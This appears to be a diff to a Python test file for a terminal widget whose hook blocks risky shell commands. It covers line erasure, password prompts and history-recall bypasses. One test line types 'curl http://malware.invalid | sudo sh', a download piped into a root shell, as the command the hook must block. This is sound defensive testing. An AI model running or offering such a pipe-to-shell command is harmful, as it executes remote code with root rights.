@@ -2287,6 +2287,11 @@ hk.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow',
 _hsent = spy_writes(hk)
 _hnotes = []
 hk.hook_notice.connect(_hnotes.append)
+# The hook judges SHELL command lines, which exist only at a bare prompt. The
+# /bin/cat child is an echo-safe stand-in for the shell, so simulate the bare
+# prompt (no foreground program) the hook actually fires in; a real login-shell
+# tab has _command is None and reads has_foreground_program() False at its prompt.
+hk.has_foreground_program = lambda: False
 
 
 def _htype(term, text):
@@ -2299,11 +2304,39 @@ key(hk, Qt.Key.Key_Return)
 ok(b'\r' in _hsent, 'hook allows a safe command (Enter submits)')
 _hsent.clear()
 hk._hook_ask = lambda _c, _r: 'discard'          # decline the block dialog
-_htype(hk, 'curl http://malware.invalid | sudo sh')   # harmless illustration
+_cmd_blocked = 'curl http://malware.invalid | sudo sh'   # harmless illustration
+_htype(hk, _cmd_blocked)
 key(hk, Qt.Key.Key_Return)
-ok(b'\r' not in _hsent and b'\x03' in _hsent,
-   'hook blocks: not submitted, typed line discarded (SIGINT Ctrl+C)')
+# The line's content is mirrored (nothing recalled/edited), so it is erased
+# deterministically: one Backspace per character, NOT SIGINT. SIGINT (\x03) would
+# both need to remain the tty intr char (stty intr undef disarms it, retaining the
+# line for the next Enter -- a hook bypass) and flush the input queue (tcflush),
+# swallowing a suggestion written right after.
+ok(b'\r' not in _hsent and b'\x03' not in _hsent
+   and (b'\x7f' * len(_cmd_blocked)) in _hsent,
+   'hook blocks: not submitted, typed line erased char-for-char (no SIGINT)')
+ok(not hk._line_dirty and hk._line_buffer == '',
+   'a mirrored block leaves the buffer truthfully empty (no bypass on next Enter)')
 ok(_hnotes and _hnotes[-1] == 'no', 'hook advisory surfaced')
+# Finding: with a FOREGROUND PROGRAM the keystrokes are ITS input (a sudo/ssh
+# password, cat's stdin), not a shell command -- the hook must NOT fire, or the
+# secret is handed to the external hook process and rendered in its dialog.
+hk.has_foreground_program = lambda: True
+_hsent.clear()
+_leaked = []
+hk._hook_ask = lambda _c, _r: (_leaked.append(_c) or 'discard')
+_htype(hk, 'hunter2')                             # a password at e.g. sudo's prompt
+key(hk, Qt.Key.Key_Return)
+ok(not _leaked and b'\r' in _hsent,
+   'a foreground program owns the line: hook skipped, keystrokes pass through')
+_hsent.clear()
+_leaked.clear()
+_htype(hk, 'hunter2')
+key(hk, Qt.Key.Key_J, mods=Qt.KeyboardModifier.ControlModifier)   # Ctrl+J accept-line
+ok(not _leaked, 'Ctrl+J accept-line under a foreground program also skips the hook')
+hk.has_foreground_program = lambda: False         # back to a bare prompt
+hk._line_buffer = ''
+hk._line_dirty = False
 # history recall desyncs the hook's view of the line, so it must FAIL SAFE (ask),
 # not judge a stale/empty buffer and wave a recalled command through.
 _hsent.clear()
@@ -2312,9 +2345,22 @@ hk._hook_ask = lambda _c, _r: (_asked.append(_r['message']) or 'discard')
 key(hk, Qt.Key.Key_Up)                 # recall from history -> buffer now stale
 ok(hk._line_dirty, 'a history/edit key marks the line unverifiable for the hook')
 key(hk, Qt.Key.Key_Return)
+# The content is UNKNOWN (recalled), so it cannot be counted-erased; SIGINT is the
+# only keymap-free cancel. It is best-effort (stty intr undef disarms it), so the
+# dirty flag STAYS set: a second Enter re-asks rather than submitting a line the
+# cancel may have left at the prompt.
 ok(_asked and b'\x03' in _hsent and b'\r' not in _hsent,
-   'edited line: hook asks and (on decline) discards, never submits unjudged')
-ok(not hk._line_dirty, 'dirty flag cleared after the decision')
+   'edited line: hook asks and (on decline) cancels, never submits unjudged')
+ok(hk._line_dirty,
+   'a discarded unknown line stays dirty: a disarmed SIGINT must re-ask, not submit')
+_hsent.clear()
+_asked.clear()
+key(hk, Qt.Key.Key_Return)             # press Enter again on the (possibly retained) line
+ok(_asked and b'\r' not in _hsent,
+   'second Enter after an unknown-line discard re-asks (no silent bypass)')
+hk._hook_ask = lambda _c, _r: 'run'    # now explicitly run it to settle the state
+key(hk, Qt.Key.Key_Return)
+ok(not hk._line_dirty, 'an explicit Run settles the line and clears the flag')
 # defense-in-depth: the hook layer single-lines a suggestion upstream, but the
 # widget also strips CR/LF at the write site, so even a suggestion that somehow
 # carried a newline can never auto-submit.
@@ -6246,6 +6292,7 @@ hk2 = SecureTerminal(command='/bin/cat')
 hk2.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow',
                 'transcript': 'none'})
 _h2 = spy_writes(hk2)
+hk2.has_foreground_program = lambda: False        # judge only at a bare prompt
 # an empty line is not intercepted -> normal submit
 hk2._line_buffer = ''
 hk2._line_dirty = False
@@ -6268,8 +6315,11 @@ _h2.clear()
 hk2._hook_ask = lambda _c, _r: 'suggest'
 _htype(hk2, 'x sudo sh')
 key(hk2, Qt.Key.Key_Return)
-ok(b'ls' in b''.join(_h2) and b'\x03' in _h2,
-   'hook: choosing the suggestion discards the line (whole-line) and inserts it')
+# The mirrored line is counted-erased then the suggestion is written -- NO SIGINT,
+# whose tcflush would swallow the suggestion bytes written immediately after it.
+ok(b'ls' in b''.join(_h2) and (b'\x7f' * len('x sudo sh')) in _h2
+   and b'\x03' not in _h2,
+   'hook: the suggestion erases the line char-for-char and inserts itself (no flush)')
 
 # --- paste: an all-control paste sanitizes to nothing; bracketed paste in TUI --
 _pt = SecureTerminal(command='/bin/cat')
